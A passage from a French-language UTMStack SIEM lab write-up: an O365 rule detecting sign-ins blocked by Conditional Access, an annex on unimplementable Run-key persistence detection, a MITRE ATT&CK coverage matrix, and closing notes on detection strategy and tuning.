        "timeZone": "UTC",
        "startTime": "05:00:00",
        "endTime": "17:00:00",
        "allDay": false
      }
    }
  }
}
```

**Note nLPD :** une politique CA temporelle doit être documentée dans le registre des activités de traitement comme contrôle d'accès système (et non évaluation des employés), communiquée aux utilisateurs dans la politique de sécurité IT, et appliquée de manière proportionnée au risque identifié.

**Lacune documentée :** `ConditionalAccessStatus` des Sign-in logs Entra ID n'est pas collecté par le connecteur O365 d'UTMStack. La règle M14 contourne cette limitation via `log.LogonError = BlockedByConditionalAccess`, présent dans les events `Audit.AzureActiveDirectory` collectés.

**Technique MITRE :** T1078.004 — Valid Accounts: Cloud Accounts

```yaml
name: O365 - Sign-In Blocked by Conditional Access Policy
dataTypes:
  - o365
impact:
  confidentiality: 2
  integrity: 2
  availability: 1
category: Initial Access
technique: T1078.004 - Valid Accounts Cloud Accounts
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1078/004/
  - https://learn.microsoft.com/en-us/entra/identity/conditional-access/overview
description: 'Une tentative de connexion a été bloquée par une politique d''Accès Conditionnel (ErrorNumber 53003, LogonError BlockedByConditionalAccess). Note nLPD : le déploiement d''une CA temporelle doit être documenté dans le registre des activités de traitement et communiqué aux utilisateurs. Next Steps: 1. Identifier le compte via origin.user. 2. Identifier l''IP via origin.ip et géolocalisation. 3. Vérifier si la connexion était légitime (déplacement, décalage horaire). 4. Corréler avec d''autres events du même compte dans les 24h. 5. Si suspect, réinitialiser le mot de passe et révoquer les sessions.'
where: |-
  equals("action", "UserLoginFailed") &&
  equals("log.LogonError", "BlockedByConditionalAccess")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** créer la politique CA, ajouter la condition temporelle via Graph API (procédure ci-dessus), passer en mode Activé. Se connecter depuis un compte non exclu en dehors des heures autorisées. L'alerte contient `log.LogonError = BlockedByConditionalAccess`, `log.ErrorNumber = 53003`, et le compte bloqué dans `origin.user`.

---

### Annexe W8 — Run Key via audit natif registre (EID 4657) — non implémentable

Cette annexe documente la tentative d'implémentation d'une règle de détection de persistance via les clés Run/RunOnce sur Windows 11, où l'agent UTMStack ne collecte pas Sysmon (limitation confirmée, GitHub issue #2446).

**Deux GPOs en place dans ce lab :**
- `Audit HKCU RunKeys` (Configuration Utilisateur) — couvre `HKCU\...\Run` et `HKCU\...\RunOnce`
- `Audit RUN KEY local machine` (Configuration Ordinateur) — couvre `HKLM\...\Run` et `HKLM\...\RunOnce`

**L'EID 4657 est bien collecté** par UTMStack. Le champ `ObjectName` (chemin de la clé modifiée) est présent dans le champ `raw` mais **n'est pas mappé** dans `log.data`. Le moteur de corrélation n'évalue pas `raw` — confirmé empiriquement.

**Faux positif documenté :** Edge et EdgeWebView écrivent dans les clés RunOnce lors de leurs mises à jour.

**Deux voies de résolution dans les versions futures :**
1. Mapping de `ObjectName` dans `log.data` pour EID 4657
2. Levée de la limitation Sysmon sur Windows 11 (issue #2446) — S5 couvrirait alors ce vecteur automatiquement

**Alternative actuelle :** MDE Plan 1 détecte nativement T1547.001 via son moteur ASEP — confirmé en conditions réelles lors des tests de ce lab.

---

## Matrice de couverture MITRE ATT&CK

Le tableau suivant récapitule les techniques ATT&CK couvertes par l'ensemble des règles de ce chapitre. Les règles non implémentables (M13, W8) figurent pour mémoire avec la mention *(annexe)*.

| Technique | ID | Règles |
|---|---|---|
| Brute Force | T1110 | W1, L1 |
| Brute Force — Password Guessing | T1110.001 | W1, L1, `o365-entra-brute-force.yml` |
| Brute Force — Password Spraying | T1110.003 | `o365-entra-password-spray.yml` |
| Boot/Logon Autostart — Run Keys | T1547.001 | S5, W8 *(annexe)* |
| Scheduled Task/Job | T1053.005 | W4 |
| Create Account — Cloud | T1136.003 | M7 |
| Valid Accounts — Cloud | T1078.004 | M14, A7, `o365-impossible-travel.yml` |
| Steal or Forge Kerberos Tickets — Kerberoasting | T1558.003 | W7 |
| OS Credential Dumping — NTDS | T1003.003 | S4 |
| Pass the Hash | T1550.002 | W6 |
| Process Injection | T1055 | S3 |
| Create or Modify System Process — Windows Service | T1543.003 | W5a, W5b |
| Signed Binary Proxy Execution — LOLBAS | T1218 | S1 |
| Account Manipulation | T1098 | W2, W3 |
| Account Manipulation — Additional Cloud Roles | T1098.003 | M6, A7 |
| Steal Application Access Token | T1528 | M2 |
| Modify Authentication Process | T1556 | M5 |
| Impair Defenses — Disable Cloud Logs | T1562.008 | M8, A8 |
| Impair Defenses — Disable or Modify Cloud Firewall | T1562.007 | A4a, A4b, A10 |
| Malware Detection | T1587.001 | WD1 |
| Impair Defenses — Tamper with Security Tools | T1562.001 | WD2, WD3, WD4, WD5 |
| Exfiltration Over Web Service | T1567 | M10, M11, M13 *(annexe)* |
| Email Collection — Remote | T1114.002 | M12 |
| Data Destruction | T1485 | A2, A9, A11 |
| System Shutdown / Reboot | T1529 | A3 |
| Exploit Public-Facing Application | T1190 | L1 |
| Abuse Elevation Control — Sudo | T1548.003 | L2 |
| Unsecured Credentials — Cloud Instance Metadata | T1552.005 | A1, A5 |
| Software Deployment Tools | T1072 | A6 |
| Indicator Removal | T1070 | M8 |
| Named Pipe — Interprocess Communication | T1559.001 | S3 |


---

## Note finale — Détection comportementale, CVE et complémentarité des outils

Ce chapitre illustre une approche de détection en trois axes :

**Détection comportementale pérenne** — les règles W1 à A6 documentées ici couvrent des techniques ATT&CK qui restent pertinentes indépendamment des CVE publiées. Une attaque par Kerberoasting (W7), par Pass-the-Hash (W6), par consentement OAuth malveillant (M2) ou par listing de clés Azure (A1) utilise les mêmes mécanismes depuis des années. Ces règles constituent le socle de détection permanent, indépendamment du calendrier des patchs.

**Réponse événementielle aux CVE critiques** — certaines vulnérabilités nécessitent une réponse immédiate dans la fenêtre entre publication et déploiement du patch. CVE-2026-41089 (Netlogon RCE, CVSS 9.8, août 2026) affectait les DCs du lab sous Windows Server 2025 : WD3 couvrait déjà les signatures Defender associées. CVE-2026-62869 (Entra ID Spoofing) a été corrigée côté Microsoft sans action requise : M5 et M3 assurent la détection compensatoire. La bonne pratique est d'évaluer si une règle existante couvre déjà le comportement exploité par la CVE avant d'en créer une nouvelle.

**Tuning continu** — les faux positifs identifiés lors des tests font partie du processus normal. Quelques exemples concrets issus de ce lab : VMware Tools qui accède légitimement à LSASS (S2), `PcaSvc.dll` qui charge rundll32 lors de diagnostics système (S1), la différence entre `Administrateurs` et `Administrators` selon la langue du système (W2), les services automatiques Azure qui listent régulièrement les clés de stockage (A1), et la boucle DLP/notification décrite en détail dans la section M ci-dessus. Chaque exclusion documentée améliore la précision sans sacrifier la couverture. L'approche défensive retenue — capturer large, exclure chirurgicalement — est préférable à une liste blanche de patterns dangereux.

**Complémentarité MDE et UTMStack** — MDE bloque en temps réel (S1 LOLBAS, S3 named pipes, S4 NTDS), UTMStack contextualise, corrèle et conserve la trace pour l'investigation. Les deux couches se sont illustrées tout au long de ce chapitre : un alert MDE sans corrélation SIEM perd son contexte ; une règle SIEM sans EDR ne bloque rien. La valeur du lab est précisément de faire fonctionner ces deux systèmes ensemble sur des événements réels, pas en simulation.

---

*Toutes les règles YAML sont disponibles dans le dépôt [`rules/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules).*
